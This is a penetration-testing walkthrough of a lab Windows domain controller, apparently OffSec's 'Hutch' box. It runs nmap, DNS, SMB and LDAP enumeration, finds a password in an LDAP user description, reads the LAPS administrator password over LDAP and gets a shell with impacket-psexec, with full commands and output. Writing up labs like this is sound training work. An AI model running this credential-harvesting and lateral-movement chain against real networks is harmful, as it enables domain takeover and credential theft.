# Hutch
## Information Gathering
## Enumeration
### Nmap scan
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/10.0
|   Server Date: Sun, 15 Jan 2023 02:09:33 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-15 02:08:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  unknown
49676/tcp open  unknown
49692/tcp open  unknown
49981/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-01-15T02:09:34
|_  start_date: N/A
|_clock-skew: -1s
```


### 53/tcp
- nmap script
```bash
sudo nmap -p53 --script=dns-blacklist.nse,dns-brute.nse,dns-cache-snoop.nse,dns-check-zone.nse,dns-client-subnet-scan.nse,dns-fuzz.nse,dns-ip6-arpa-scan.nse,dns-nsec3-enum.nse,dns-nsec-enum.nse,dns-nsid.nse,dns-random-srcport.nse,dns-random-txid.nse,dns-recursion.nse,dns-service-discovery.nse,dns-srv-enum.nse,dns-update.nse,dns-zeustracker.nse,dns-zone-transfer.nse -Pn 192.168.107.122 -oN tcp53_dns.nmap

PORT   STATE SERVICE
53/tcp open  domain
|_dns-fuzz: Server didnt response to our probe, cant fuzz
|_dns-nsec3-enum: Cant determine domain for host 192.168.107.122; use dns-nsec3-enum.domains script arg.
|_dns-nsec-enum: Cant determine domain for host 192.168.107.122; use dns-nsec-enum.domains script arg.

Host script results:
|_dns-brute: Cant guess domain of "192.168.107.122"; use dns-brute.domain script argument.
| dns-blacklist: 
|   SPAM
|     l2.apews.org - FAIL
|     list.quorum.to - FAIL
|_    dnsbl.inps.de - FAIL
```


- Using `dig` to query Any record from the DNS server
```bash
dig any hutch.offsec0. @192.168.107.122

; <<>> DiG 9.18.6-2-Debian <<>> any hutch.offsec0. @192.168.107.122
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 22893
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;hutch.offsec0.                 IN      ANY

;; Query time: 2265 msec
;; SERVER: 192.168.107.122#53(192.168.107.122) (TCP)
;; WHEN: Sat Jan 14 20:41:22 EST 2023
;; MSG SIZE  rcvd: 42
```
- Using dig to initiate a zone transfer
```bash
dig axfr hutch.offsec0. @192.168.107.122

; <<>> DiG 9.18.6-2-Debian <<>> axfr hutch.offsec0. @192.168.107.122
;; global options: +cmd
; Transfer failed.
```

- Subdomain enumeration
```bash
dnsenum 192.168.107.122 -o dnsenum.txt
dnsenum VERSION:1.2.6

-----   192.168.107.122   -----


Host's addresses:
__________________



Name Servers:
______________

 192.168.107.122 NS record query failed: NXDOMAIN
```


### 80/tcp
#### Technologies
- Microsoft-IIS/10.0

- Getting HTTP header
```bash
curl -L -I "http://192.168.107.122"
HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Wed, 04 Nov 2020 05:35:35 GMT
Accept-Ranges: bytes
ETag: "965c9516cb2d61:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sun, 15 Jan 2023 01:53:22 GMT
```
- Veriftying that this HTTP server has the PUT verb enabled
```bash
curl -X OPTIONS "http://192.168.107.122" -v
*   Trying 192.168.107.122:80...
* Connected to 192.168.107.122 (192.168.107.122) port 80 (#0)
> OPTIONS / HTTP/1.1
> Host: 192.168.107.122
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
< Server: Microsoft-IIS/10.0
< Public: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
< DAV: 1,2,3
< MS-Author-Via: DAV
< X-Powered-By: ASP.NET
< Date: Sun, 15 Jan 2023 02:08:14 GMT
< Content-Length: 0
```


- Could not PUT files got 401 Unauthorized
```bash
curl -X PUT "http://192.168.107.122" -d @readme.txt
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
```




- Running `gobuster`
```bash
gobuster dir -u http://192.168.107.122 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x html,asp,aspx,js,txt,bak -o gobuster/192.168.107.122-root.gob -b 400,401,404
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.107.122
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              bak,html,asp,aspx,js,txt
[+] Timeout:                 10s
===============================================================
2023/01/14 21:00:05 Starting gobuster in directory enumeration mode
===============================================================
/index.aspx           (Status: 500) [Size: 3420]
```


### 135/tcp
- Using NULL share to use rpcclient
```bash
rpcclient -U '' -N 192.168.107.122
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```


### 139/tcp, 445/tcp
- nmap safe scan
```bash
sudo nmap -p139,445 --script=smb2-capabilities.nse,smb2-security-mode.nse,smb2-time.nse,smb2-vuln-uptime.nse,smb-brute.nse,smb-double-pulsar-backdoor.nse,smb-enum-services.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-protocols.nse,smb-security-mode.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse -oN smb_safe.nmap -Pn 192.168.107.122
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-14 20:48 EST
Nmap scan report for 192.168.107.122
Host is up (0.020s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb-protocols: 
|   dialects: 
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1
| smb2-time: 
|   date: 2023-01-15T01:49:05
|_  start_date: N/A
| smb2-capabilities: 
|   2.0.2: 
|     Distributed File System
|   2.1: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.0.2: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3.1.1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_smb-vuln-ms10-054: false
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
```

- nmap vulnerability scan
```bash
sudo nmap -p139,445 --script=smb-vuln* 192.168.107.122 -Pn -oN smb-vuln-scanner.nmap 
[sudo] password for Default: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-14 21:04 EST
Nmap scan report for hutch.offsec0 (192.168.107.122)
Host is up (0.018s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
```


- smbmap for NULL shares
```bash
smbmap -u '' -p '' -H 192.168.107.122            
[+] IP: 192.168.107.122:445     Name: 192.168.107.122
```
- smbclient for NULL shares
```bash
smbclient -L \\\\192.168.107.122       
Password for [WORKGROUP\Default]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.107.122 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- Testing credentials `fmcsorley:CrabSharkJellyfish192` with smbclient
```bash
smbclient -L \\\\192.168.107.122 -U "fmcsorley"
Password for [WORKGROUP\fmcsorley]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```


- Downloading `IPC$`, `NETLOGON`, `SYSVOL`
- `IPC$`
```bash
smbclient \\\\192.168.107.122\\IPC$ -U "fmcsorley"                        
Password for [WORKGROUP\fmcsorley]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```

- `NETLOGON`
```bash
smbclient \\\\192.168.107.122\\NETLOGON -U "fmcsorley"
Password for [WORKGROUP\fmcsorley]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov  4 00:25:31 2020
  ..                                  D        0  Wed Nov  4 00:25:31 2020
```

- `SYSVOL`
```bash
smbclient \\\\192.168.107.122\\SYSVOL -U "fmcsorley"
Password for [WORKGROUP\fmcsorley]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

### 389/tcp
- LDAP search. Bind DN (-D), simple authentication (-x), bind password (-w), base dn for search (-b)
```bash
ldapsearch -x -H ldap://192.168.107.122 -D '' -w '' -b "dc=hutch,dc=offsec" > ldapsearch.txt
```
- Looking at samaccount names
```bash
cat ldapsearch.txt | grep -i "samaccountname:" | cut -d ':' -f 2 | sed -z 's/ //g'
Guest
DomainComputers
CertPublishers
DomainUsers
DomainGuests
GroupPolicyCreatorOwners
RASandIASServers
AllowedRODCPasswordReplicationGroup
DeniedRODCPasswordReplicationGroup
EnterpriseRead-onlyDomainControllers
CloneableDomainControllers
ProtectedUsers
DnsAdmins
DnsUpdateProxy
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley
```

- Interesting description
```
# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20210216133934.0Z
uSNCreated: 12831
uSNChanged: 49179
name: Freddy McSorley
objectGUID:: TxilGIhMVkuei6KplCd8ug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132489437036308102
lastLogoff: 0
lastLogon: 132579563744834908
pwdLastSet: 132489417058152751
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132579563744834908
msDS-SupportedEncryptionTypes: 0
```
- This may provide us with credentials `fmcsorley:CrabSharkJellyfish192`
```bash
crackmapexec smb 192.168.107.122 -u "fmcsorley" -p "CrabSharkJellyfish192"
SMB         192.168.107.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.107.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192
```

## Foothold
- This allows us to remote in
```bash
impacket-psexec hutch.offsec/administrator:'{2e$D2w/gh+Vwt'@192.168.107.122
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.107.122.....
[*] Found writable share ADMIN$
[*] Uploading file HRoGzpHf.exe
[*] Opening SVCManager on 192.168.107.122.....
[*] Creating service JOzB on 192.168.107.122.....
[*] Starting service JOzB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```


## Domain
- Domain name is `hutch.offsec`

- Getting all AD users
```bash
impacket-GetADUsers -all -dc-ip 192.168.107.122 hutch.offsec/fmcsorley        
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Querying 192.168.107.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2023-01-14 22:05:42.776844  2020-11-04 00:58:40.654236 
Guest                                                 <never>              <never>             
krbtgt                                                2020-11-04 00:26:23.099902  <never>             
rplacidi                                              2020-11-04 00:35:05.106274  <never>             
opatry                                                2020-11-04 00:35:05.216273  <never>             
ltaunton                                              2020-11-04 00:35:05.264272  <never>             
acostello                                             2020-11-04 00:35:05.315273  <never>             
jsparwell                                             2020-11-04 00:35:05.377272  <never>             
oknee                                                 2020-11-04 00:35:05.433274  <never>             
jmckendry                                             2020-11-04 00:35:05.492273  <never>             
avictoria                                             2020-11-04 00:35:05.545279  <never>             
jfrarey                                               2020-11-04 00:35:05.603273  <never>             
eaburrow                                              2020-11-04 00:35:05.652273  <never>             
cluddy                                                2020-11-04 00:35:05.703274  <never>             
agitthouse                                            2020-11-04 00:35:05.760273  <never>             
fmcsorley                                             2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491 
domainadmin                                           2021-02-16 00:24:22.190351  2023-01-14 22:02:25.370598
```

- Performing `impacket-secretsdump`
```bash
impacket-secretsdump hutch.offsec/fmcsorley:CrabSharkJellyfish192@192.168.107.122
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up..
```

- Attempting to remote in with `impacket-psexec`
```bash
impacket-psexec hutch.offsec/fmcsorley:CrabSharkJellyfish192@192.168.107.122  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.107.122.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
```

- Query for SPNs that are running under a user using `GetNPUsers`
```bash
impacket-GetUserSPNs hutch.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip 192.168.107.122 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

No entries found!
```

- Verifyng usernames
```bash
 kerbrute_linux_amd64 userenum -d hutch.offsec --dc 192.168.107.122 domain-users.txt                  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/14/23 - Ronnie Flathers @ropnop

2023/01/14 23:01:40 >  Using KDC(s):
2023/01/14 23:01:40 >   192.168.107.122:88

2023/01/14 23:01:40 >  [+] VALID USERNAME:       Administrator@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       opatry@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       ltaunton@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       rplacidi@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       jsparwell@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       acostello@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       jmckendry@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       oknee@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       jfrarey@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       avictoria@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       agitthouse@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       eaburrow@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       cluddy@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       fmcsorley@hutch.offsec
2023/01/14 23:01:40 >  [+] VALID USERNAME:       domainadmin@hutch.offsec
2023/01/14 23:01:40 >  Done! Tested 17 usernames (15 valid) in 0.050 seconds
```


- Running remote bloodhound
```bash
bloodhound-python -u "fmcsorley" -p "CrabSharkJellyfish192" -d hutch.offsec -c all -ns 192.168.107.122
```
- Selecting `Find Computers where Domain Users can read LAPS passwords` shows that our user `fmcsorley` has `RealLAPSPassword` on the domain controller.
- We can read these passwords using LDAP search for `(ms-MCS-AdmPwd=*)`
```bash
ldapsearch -x -H ldap://192.168.107.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b "dc=hutch,dc=offsec" "(ms-MCS-AdmPwd=*)"

name: HUTCHDC
ms-Mcs-AdmPwd: {2e$D2w/gh+Vwt
```
- We pull a password `{2e$D2w/gh+Vwt`. Using `crackmapexec` we can try this password with the domain users list we have
```bash
crackmapexec smb 192.168.107.122 -u domain/domain-users.txt -p '{2e$D2w/gh+Vwt'
SMB         192.168.107.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.107.122 445    HUTCHDC          [+] hutch.offsec\Administrator:{2e$D2w/gh+Vwt (Pwn3d!)
```

- This allows us to remote in
```bash
impacket-psexec hutch.offsec/administrator:'{2e$D2w/gh+Vwt'@192.168.107.122
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.107.122.....
[*] Found writable share ADMIN$
[*] Uploading file HRoGzpHf.exe
[*] Opening SVCManager on 192.168.107.122.....
[*] Creating service JOzB on 192.168.107.122.....
[*] Starting service JOzB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```